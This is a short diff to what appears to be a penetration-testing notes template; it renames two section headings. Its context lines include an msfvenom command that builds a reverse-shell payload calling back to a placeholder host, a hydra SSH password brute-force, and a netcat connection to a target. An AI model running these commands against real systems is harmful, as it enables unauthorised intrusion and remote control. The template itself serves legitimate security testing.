@@ -12,7 +12,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f elf -o s
 
 INSERTTCPSCAN
 
-### TCP Scan
+### Full TCP Scan
 
 INSERTFULLTCPSCAN
 
@@ -75,7 +75,7 @@ hydra -I -t 5 -l username -P password ssh://INSERTIPADDRESS
 nc INSERTIPADDRESS 22
 ```
 
-### Port 25
+### Port 25 - SMTP
 
 - Name:
 - Version:
